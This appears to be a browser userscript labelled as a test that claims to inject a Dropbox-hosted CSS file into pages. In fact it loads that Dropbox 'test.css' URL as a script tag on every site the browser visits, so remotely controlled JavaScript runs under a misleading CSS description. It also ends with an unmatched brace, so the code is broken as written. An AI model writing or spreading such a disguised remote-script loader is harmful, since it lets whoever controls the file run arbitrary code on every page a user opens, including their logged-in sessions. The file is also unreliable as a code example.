// ==UserScript==
// @name            USERSCRIPT--TEST
// @version         1
// @author          RSSR
// @description     Injects Dropbox Css File Into DOM
// @namespace       
// @license         Apache License V2
// @match           *
// @match           *
// ==/UserScript==

(function() {
    let style = `<style>
	
</style>`;

    document.head.insertAdjacentHTML("beforeend", style);
})();

(function(d, script) {
    script = d.createElement('script');
    script.type = 'text/javascript';
    script.async = true;
    script.onload = function() {
        // remote script has loaded
    };
    script.src = 'https://dl.dropboxusercontent.com/scl/fi/fz4m9exq4kpklw90qs6nc/test.css?rlkey=4n9nsext9j5tkseq7pinwj55n&raw=1';
    d.getElementsByTagName('head')[0].appendChild(script);
}(document));
}